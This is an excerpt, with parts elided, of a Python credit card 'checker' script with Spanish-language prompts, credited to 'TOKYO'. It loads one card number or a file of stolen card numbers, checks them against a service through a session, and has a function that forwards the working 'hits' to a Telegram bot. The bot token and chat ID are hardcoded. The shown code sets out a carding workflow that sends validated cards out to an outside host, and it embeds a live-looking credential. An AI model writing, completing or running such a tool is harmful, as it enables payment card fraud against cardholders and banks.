...
def send_hits_to_telegram():
    telegram_token = "8090451672:AAGrJrUNfHfPjrcIQiJCo5pY0Lz5fgmkEdE"
    telegram_chat_id = "5176615856"
...
def get_credit_cards():
    print_red("[+] QUIERES COMPROBAR:")
    print_green("[/] 1. UNA SOLA TARJETA")
    print_green("[/] 2. MULTIPLES TARJETAS")
    choice = input(f"""\033[92m{'[+] PRESIONA 1 O 2: '}\033[0m""").strip()
    if choice == "1":
        cc = input(f"\033[92m{'[~] Enter the cc: '}\033[0m").strip()
        print_line()
        return [cc]
    elif choice == "2":
        file_path = input(f"\033[92m{'[~] INGRESA EL (.txt) O RUTA DEL ARCHIVO: '}\033[0m").strip()
        try:
            with open(file_path, "r") as file:
                cc_list = [line.strip() for line in file if line.strip()]
                print_green(f"CARGADO {len(cc_list)} LAS TARJETAS DEL ARCHIVO.")
                print_line()
                return cc_list
        except FileNotFoundError:
            print_red("Archivo no encontrado. Verifique la ruta del archivo e inténtelo nuevamente.")
            return []
    else:
        print_red("Elección no válida. Por favor ingrese 1 o 2.")
        return []
...
[÷] Time: {minutes} min and {seconds:.2f} sec""")
    print_line()
    typing_animation('GRACIAS POR USAR EL CHEKER')
...
def main():
    ...
    typing_animation("CHECK PROVIDED BY TOKYO....")
    session = manage_session_file()
    if session:
    
        cc_list = get_credit_cards()
        if cc_list:
            print_green("          COMPROBANDO TARJETAS...")
            check_credit_cards(cc_list,session)
        else:
            print_red("No se proporcionó ninguna tarjeta de crédito válida.")
    else:
